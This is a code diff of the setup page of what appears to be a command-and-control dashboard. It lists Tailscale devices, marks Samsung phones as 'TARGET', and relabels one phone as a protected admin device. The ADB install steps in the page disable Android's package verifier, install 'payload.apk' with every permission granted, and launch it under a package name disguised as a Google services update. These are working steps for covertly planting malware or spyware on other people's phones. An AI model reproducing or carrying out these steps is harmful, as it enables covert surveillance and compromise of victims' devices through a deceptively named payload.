@@ -238,7 +238,7 @@ export default function SetupPage() {
             <div className="space-y-1.5 font-mono text-[10px]">
               {[
                 { name: "starlights-macbook-pro", ip: "100.120.150.28", type: "macOS",   status: "online",  note: "← This machine (C2 server)" },
-                { name: "juniors-s24",            ip: "100.105.68.30",  type: "android", status: "offline", note: "Samsung Galaxy S24 — TARGET" },
+                { name: "juniors-s24",            ip: "100.105.68.30",  type: "android", status: "offline", note: "Samsung Galaxy S24 — ADMIN DEVICE (protected)" },
                 { name: "juniors-s25",            ip: "100.88.11.81",   type: "android", status: "offline", note: "Samsung Galaxy S25 — TARGET" },
                 { name: "jerry",                  ip: "100.105.195.8",  type: "linux",   status: "online",  note: "Linux device" },
                 { name: "rainbow",                ip: "100.69.200.123", type: "linux",   status: "online",  note: "Linux device" },
@@ -457,7 +457,7 @@ export default function SetupPage() {
                 {
                   method: "ADB Install (if USB / Tailscale ADB)",
                   steps: [
-                    "adb connect juniors-s24:5555   # connect over Tailscale",
+                    "adb connect <TARGET_DEVICE_IP>:5555   # connect to target",
                     "adb shell settings put global package_verifier_enable 0",
                     "adb install -g -t payload.apk",
                     "adb shell am start -n com.google.services.update/.MainActivity",
